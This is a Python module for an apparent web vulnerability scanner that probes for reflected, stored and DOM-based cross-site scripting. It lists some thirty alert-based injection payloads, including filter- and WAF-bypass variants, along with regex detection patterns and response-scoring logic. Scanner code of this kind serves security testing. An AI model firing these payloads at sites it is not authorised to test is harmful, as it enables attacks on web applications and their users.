import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class XSSInjector(BaseInjector):
    """Cross-Site Scripting (XSS) testing — reflected, stored, and DOM-based detection."""

    name = "xss"
    description = "Tests for reflected and stored XSS vulnerabilities"

    # Unique marker used to detect reflection without triggering WAFs
    _CANARY = "x5s7k9q"

    # Patterns that indicate our payload was reflected unescaped
    REFLECTION_PATTERNS = [
        r"<script[^>]*>.*?</script>",
        r"on\w+\s*=\s*[\"']",            # event handler attributes
        r"javascript\s*:",                 # javascript: URIs
        r"<img[^>]+onerror",
        r"<svg[^>]+onload",
        r"<iframe[^>]+src\s*=",
        r"<body[^>]+onload",
        r"expression\s*\(",               # CSS expression()
        r"url\s*\(\s*[\"']?javascript:",  # CSS url(javascript:)
    ]

    def generate_payloads(self, context: dict) -> list[str]:
        c = self._CANARY
        return [
            # ── Basic reflection probes ──
            f"<script>{c}</script>",
            f"<script>alert('{c}')</script>",
            f"<ScRiPt>{c}</ScRiPt>",                          # case variation

            # ── Event handler injection ──
            f'"><img src=x onerror=alert("{c}")>',
            f"'><img src=x onerror=alert('{c}')>",
            f'" onmouseover="alert(\'{c}\')" x="',
            f"' onfocus='alert(`{c}`)' autofocus='",
            f'"><svg onload=alert("{c}")>',
            f"'><svg/onload=alert('{c}')>",
            f'"><body onload=alert("{c}")>',

            # ── Attribute escape ──
            f'" ><script>{c}</script>',
            f"' ><script>{c}</script>",
            f'`><script>{c}</script>',

            # ── Template literal / backtick ──
            f"${{alert('{c}')}}",
            f"`${{alert('{c}')}}`",

            # ── href / src injection ──
            f'javascript:alert("{c}")',
            f"javascript:alert('{c}')",
            f'"><a href="javascript:alert(\'{c}\')">click</a>',
            f'"><iframe src="javascript:alert(\'{c}\')">',

            # ── SVG-based ──
            f'<svg><script>alert("{c}")</script></svg>',
            f"<svg/onload=alert('{c}')>",
            f'<svg><animate onbegin=alert("{c}") attributeName=x>',

            # ── Encoded / obfuscated ──
            f"<img src=x onerror=alert(String.fromCharCode(120,53,115))>",  # x5s
            f"%3Cscript%3Ealert('{c}')%3C/script%3E",
            f"&lt;script&gt;alert('{c}')&lt;/script&gt;",
            f'<script>alert`{c}`</script>',                   # template literal call

            # ── DOM-based vectors ──
            f'#"><img src=x onerror=alert("{c}")>',
            f"javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert({c})//'>",

            # ── Filter bypass payloads ──
            f"<scr<script>ipt>alert('{c}')</scr</script>ipt>",  # nested tag bypass
            f"<img/src=x onerror=alert('{c}')>",                # no space
            f"<details open ontoggle=alert('{c}')>",
            f"<input type=text value='' onfocus=alert('{c}') autofocus>",
            f"<marquee onstart=alert('{c}')>",
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        baseline_body = baseline.get("body", "")
        test_status = test_response.get("status_code", 0)

        # 1. Check if our canary appears in the response at all
        canary_in_response = self._CANARY in body
        canary_in_baseline = self._CANARY in baseline_body

        if not canary_in_response:
            # Check for potential stored XSS: the server must have accepted
            # the payload the same way it accepted the baseline (same status,
            # similar response).  If the response differs significantly from
            # baseline, the server rejected or errored — not stored XSS.
            if (
                test_status == 200
                and baseline.get("status_code") == 200
                and body == baseline_body
            ):
                return VulnerabilityReport(
                    is_vulnerable=True,
                    confidence="low",
                    details="Payload accepted by server (response identical to baseline) — potential stored XSS. Verify by loading the data back.",
                )
            return VulnerabilityReport(
                is_vulnerable=False,
                confidence="low",
                details="Payload not reflected in response",
            )

        # 2. Check if the raw payload (unescaped) is reflected back
        if payload in body and payload not in baseline_body:
            evidence.append("Payload reflected unescaped in response body")
            is_vulnerable = True
            confidence = "high"

        # 3. Check for dangerous patterns in the response
        for pattern in self.REFLECTION_PATTERNS:
            matches_test = re.findall(pattern, body, re.IGNORECASE)
            matches_base = re.findall(pattern, baseline_body, re.IGNORECASE)
            # New matches that weren't in baseline
            if len(matches_test) > len(matches_base):
                evidence.append(f"Dangerous pattern appeared: {pattern}")
                is_vulnerable = True
                if confidence != "high":
                    confidence = "medium"

        # 4. Check if HTML entities were NOT applied (< and > present raw)
        if canary_in_response and not canary_in_baseline:
            # Check if script tags survived
            if f"<script>{self._CANARY}</script>" in body.lower():
                evidence.append("Script tag with canary reflected without encoding")
                is_vulnerable = True
                confidence = "high"

            # Check if event handlers survived
            event_with_canary = re.search(
                rf'on\w+\s*=\s*["\']?[^"\']*{self._CANARY}', body, re.IGNORECASE,
            )
            if event_with_canary:
                evidence.append("Event handler with canary reflected in attribute")
                is_vulnerable = True
                confidence = "high"

        # 5. Content-Type check — XSS only matters if HTML is rendered
        content_type = test_response.get("headers", {}).get("content-type", "")
        if is_vulnerable and "json" in content_type:
            confidence = "low"
            evidence.append("Response is JSON — reflected but unlikely exploitable via browser")
        if is_vulnerable and "text/plain" in content_type:
            confidence = "low"
            evidence.append("Response is text/plain — browser won't render HTML")

        # 6. Check for common XSS protection headers (informational)
        headers = test_response.get("headers", {})
        csp = headers.get("content-security-policy", "")
        xss_protection = headers.get("x-xss-protection", "")

        if is_vulnerable and csp and "script-src" in csp:
            evidence.append(f"Note: CSP present ({csp[:80]}...) — may mitigate exploitation")
        if xss_protection.startswith("1"):
            evidence.append("Note: X-XSS-Protection header enabled")

        # 7. Server error may indicate WAF blocking
        if test_status == 403 and is_vulnerable:
            evidence.append("403 returned — possible WAF blocking the payload")
            confidence = "low"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "Canary reflected but no dangerous patterns found",
            evidence=evidence,
        )
